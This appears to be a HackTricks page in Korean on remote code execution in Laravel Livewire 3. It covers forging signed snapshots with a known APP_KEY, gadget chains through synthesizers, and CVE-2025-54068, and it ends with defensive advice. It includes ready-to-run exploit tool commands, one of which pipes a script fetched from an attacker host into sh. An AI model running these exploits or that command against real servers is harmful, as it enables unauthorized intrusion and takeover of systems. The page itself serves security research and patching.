# Laravel Livewire Hydration & Synthesizer 남용

{{#include ../../banners/hacktricks-training.md}}

## Livewire 상태 머신 요약

Livewire 3 컴포넌트는 `data`, `memo`, 그리고 checksum을 포함하는 **snapshots**를 통해 상태를 교환합니다. `/livewire/update`로 들어오는 모든 POST는 서버 측에서 JSON snapshot을 rehydrate(재수화)하고 대기 중인 `calls`/`updates`를 실행합니다.
```php
class Checksum {
static function verify($snapshot) {
$checksum = $snapshot['checksum'];
unset($snapshot['checksum']);
if ($checksum !== self::generate($snapshot)) {
throw new CorruptComponentPayloadException;
}
}

static function generate($snapshot) {
return hash_hmac('sha256', json_encode($snapshot), $hashKey);
}
}
```
`APP_KEY`(이 `$hashKey`를 도출하는 데 사용되므로)를 가진 사람은 HMAC를 재계산하여 임의의 스냅샷을 위조할 수 있다.

복합 속성은 `Livewire\Drawer\BaseUtils::isSyntheticTuple()`로 감지되는 **synthetic tuples**로 인코딩된다; 각 튜플은 `[value, {"s":"<key>", ...meta}]`이다. hydration 코어는 단순히 모든 튜플을 `HandleComponents::$propertySynthesizers`에서 선택된 synth에 위임하고 자식 요소에 대해 재귀적으로 처리한다:
```php
protected function hydrate($valueOrTuple, $context, $path)
{
if (! Utils::isSyntheticTuple($value = $tuple = $valueOrTuple)) return $value;
[$value, $meta] = $tuple;
$synth = $this->propertySynth($meta['s'], $context, $path);
return $synth->hydrate($value, $meta, fn ($name, $child)
=> $this->hydrate($child, $context, "{$path}.{$name}"));
}
```
이 재귀적 설계는 공격자가 튜플 메타데이터 또는 재귀 처리 중의 어떤 중첩 튜플을 제어하게 되면 Livewire를 **범용 객체 인스턴스화 엔진**으로 만든다.

## Synthesizers that grant gadget primitives

| Synthesizer | 공격자가 제어하는 동작 |
|-------------|------------------------|
| **CollectionSynth (`clctn`)** | 각 자식을 재수화(rehydrate)한 후 `new $meta['class']($value)`를 인스턴스화한다. 배열을 인자로 받는 생성자를 가진 클래스라면 어떤 클래스든 생성할 수 있고, 각 항목 자체가 합성 튜플일 수 있다. |
| **FormObjectSynth (`form`)** | `new $meta['class']($component, $path)`를 호출한 다음, `$hydrateChild`를 통해 공격자가 제어하는 자식들로부터 모든 public 프로퍼티를 할당한다. 두 개의 느슨한 타입 파라미터(또는 기본값)를 받는 생성자만으로 임의의 public 프로퍼티에 접근할 수 있다. |
| **ModelSynth (`mdl`)** | meta에서 `key`가 없으면 `return new $class;`를 실행하여 공격자가 제어하는 어떤 클래스든 인자 없는 인스턴스화를 허용한다. |

`synths`가 모든 중첩 요소에서 `$hydrateChild`를 호출하기 때문에, 튜플을 재귀적으로 쌓아 임의의 gadget 그래프를 구성할 수 있다.

## Forging snapshots when `APP_KEY` is known

1. 정상적인 `/livewire/update` 요청을 캡처하고 `components[0].snapshot`을 디코딩한다.
2. gadget 클래스를 가리키는 중첩 튜플을 주입하고 `checksum = hash_hmac('sha256', json_encode(snapshot_without_checksum), APP_KEY)`를 재계산한다.
3. 스냅샷을 다시 인코딩하고 `_token`/`memo`는 건드리지 않은 채로 요청을 재생(replay)한다.

최소 실행 증명(proof of execution)은 **Guzzle의 `FnStream`**과 **Flysystem의 `ShardedPrefixPublicUrlGenerator`**를 사용한다. 한 튜플은 생성자 데이터로 `{ "__toString": "phpinfo" }`를 사용해 `FnStream`을 인스턴스화하고, 다음 튜플은 `$prefixes`로 `[FnStreamInstance]`를 사용해 `ShardedPrefixPublicUrlGenerator`를 인스턴스화한다. Flysystem이 각 prefix를 `string`으로 캐스트하면 PHP는 공격자가 제공한 `__toString` callable을 호출하여 인자가 없는 임의의 함수를 실행한다.

### From function calls to full RCE

Livewire의 인스턴스화 프리미티브를 이용해 Synacktiv는 phpggc의 `Laravel/RCE4` 체인을 적응시켜, hydration이 public Queueable 상태가 역직렬화를 트리거하는 객체를 부트하도록 만들었다:

1. **Queueable trait** – `Illuminate\Bus\Queueable`를 사용하는 모든 객체는 public `$chained`를 노출하며 `dispatchNextJobInChain()`에서 `unserialize(array_shift($this->chained))`를 실행한다.
2. **BroadcastEvent wrapper** – `Illuminate\Broadcasting\BroadcastEvent` (ShouldQueue)는 public `$chained`가 채워진 상태로 `CollectionSynth` / `FormObjectSynth`를 통해 인스턴스화된다.
3. **phpggc Laravel/RCE4Adapted** – `$chained[0]`에 저장된 직렬화된 블롭은 `PendingBroadcast -> Validator -> SerializableClosure\Serializers\Signed`를 구성한다. `Signed::__invoke()`는 결국 `call_user_func_array($closure, $args)`를 호출하여 `system($cmd)`를 가능하게 한다.
4. **Stealth termination** – `[new Laravel\Prompts\Terminal(), 'exit']`와 같은 두 번째 `FnStream` callable을 제공함으로써, 시끄러운 예외 대신 `exit()`로 요청을 종료시켜 HTTP 응답을 깔끔하게 유지할 수 있다.

### Automating snapshot forgery

`synacktiv/laravel-crypto-killer`는 이제 모든 것을 연결하는 `livewire` 모드를 제공한다:
```bash
./laravel_crypto_killer.py exploit -e livewire -k base64:APP_KEY \
-j request.json --function system -p "bash -c 'id'"
```
이 도구는 캡처된 스냅샷을 파싱하고, gadget tuples를 주입하며, checksum을 재계산하고, 전송 준비가 된 `/livewire/update` 페이로드를 출력한다.

## CVE-2025-54068 – RCE `APP_KEY` 없이

벤더 권고에 따르면, 이 문제는 Livewire v3 (>= 3.0.0-beta.1 and < 3.6.3)에 영향을 미치며 v3에만 고유하다.

`updates`는 스냅샷 checksum이 검증된 **후에** 컴포넌트 상태에 병합된다. 스냅샷 내부의 프로퍼티가 (또는 synthetic tuple이 되면), Livewire는 공격자가 제어하는 update 값으로 hydrating할 때 해당 meta를 재사용한다:
```php
protected function hydrateForUpdate($raw, $path, $value, $context)
{
$meta = $this->getMetaForPath($raw, $path);
if ($meta) {
return $this->hydrate([$value, $meta], $context, $path);
}
}
```
익스플로잇 절차:

1. Livewire 컴포넌트에서 untyped public property를 찾습니다(예: `public $count;`).
2. 해당 속성을 `[]`로 설정하는 update를 전송합니다. 다음 snapshot은 이제 이를 `[[], {"s": "arr"}]`로 저장합니다.

간단한 타입 저글링 흐름은 다음과 같습니다:

```http
POST /livewire/update
...
"updates": {"count": []}
```

그럼 다음 스냅샷은 `arr` synthesizer 메타데이터를 유지하는 튜플을 저장합니다:

```json
"count": [[], {"s": "arr"}]
```

3. 해당 속성이 `[ <payload>, {"s":"clctn","class":"GuzzleHttp\\Psr7\\FnStream"} ]` 같은 튜플을 포함하는 깊게 중첩된 배열을 담도록 또 다른 `updates` 페이로드를 구성합니다.
4. 재귀 중에 `hydrate()`는 각 중첩 자식을 독립적으로 평가하므로, 외부 튜플과 체크섬이 변경되지 않았더라도 공격자가 선택한 synth 키/클래스가 존중됩니다.
5. 동일한 `CollectionSynth`/`FormObjectSynth` 프리미티브를 재사용해 `$chained[0]`에 phpggc 페이로드를 담은 Queueable gadget을 인스턴스화합니다. Livewire가 위조된 updates를 처리하면 `dispatchNextJobInChain()`를 호출하고 `system(<cmd>)`에 도달하며 APP_KEY를 알 필요가 없습니다.

작동하는 주요 이유:

- `updates`는 snapshot 체크섬에 포함되지 않습니다.
- `getMetaForPath()`는 공격자가 이전에 약한 타입 강제(weak typing)로 튜플로 만든 경우에도 해당 속성에 이미 존재하던 synth 메타데이터를 신뢰합니다.
- 재귀와 약한 타입 강제는 각 중첩 배열이 완전히 새로운 튜플로 해석되도록 하여 결국 임의의 synth 키와 임의의 클래스가 hydration에 도달하게 합니다.

## Livepyre – end-to-end exploitation

[Livepyre](https://github.com/synacktiv/Livepyre) automates both the APP_KEY-less CVE and the signed-snapshot path:

- 배포된 Livewire 버전을 `<script src="/livewire/livewire.js?id=HASH">`를 파싱하여 지문화하고 해시를 취약한 릴리스에 매핑합니다.
- 정상 동작을 재생(replaying)하고 `components[].snapshot`을 추출하여 기준선 스냅샷을 수집합니다.
- phpggc 체인을 임베드한 `updates` 전용 페이로드(CVE-2025-54068) 또는 위조된 스냅샷(known APP_KEY) 중 하나를 생성합니다.
- 스냅샷에서 object-typed parameter가 발견되지 않으면, Livepyre는 coercible property에 도달하기 위해 후보 params를 brute-forcing하는 방식으로 폴백합니다.

Typical usage:
```bash
# CVE-2025-54068, unauthenticated
python3 Livepyre.py -u https://target/livewire/component -f system -p id

# Signed snapshot exploit with known APP_KEY
python3 Livepyre.py -u https://target/livewire/component -a base64:APP_KEY \
-f system -p "bash -c 'curl attacker/shell.sh|sh'"
```
`-c/--check`는 비파괴적 프로브를 실행하고, `-F`는 버전 게이팅을 건너뛰며, `-H`와 `-P`는 커스텀 헤더 또는 프록시를 추가하고, `--function/--param`은 gadget chain이 호출하는 php 함수를 맞춤화합니다.

## 방어적 고려사항

- 수정된 Livewire 빌드(공급업체 권고에 따르면 >= 3.6.4)로 업그레이드하고 CVE-2025-54068에 대한 공급업체 패치를 배포하세요.
- Livewire 컴포넌트에서 약한 타입의 public 속성을 피하세요; 명시적 스칼라 타입은 속성 값이 배열/튜플로 강제 변환되는 것을 방지합니다.
- 실제로 필요한 synthesizers만 등록하고 사용자 제어 메타데이터(`$meta['class']`)를 신뢰하지 마세요.
- 속성의 JSON 타입이 변경되는 업데이트(예: scalar -> array)는 명시적으로 허용되지 않는 한 거부하고, 오래된 튜플을 재사용하지 말고 synth metadata를 재도출하세요.
- 어떤 노출이 발생한 후에는 `APP_KEY`를 즉시 교체하세요. 이는 코드베이스가 아무리 패치되어도 오프라인 스냅샷 위조를 가능하게 합니다.

## References

- [Synacktiv – Livewire: Remote Command Execution via Unmarshaling](https://www.synacktiv.com/publications/livewire-execution-de-commandes-a-distance-via-unmarshaling.html)
- [synacktiv/laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer)
- [synacktiv/Livepyre](https://github.com/synacktiv/Livepyre)
- [GHSA-29cq-5w36-x7w3 – Livewire v3 RCE advisory](https://github.com/livewire/livewire/security/advisories/GHSA-29cq-5w36-x7w3)

{{#include ../../banners/hacktricks-training.md}}
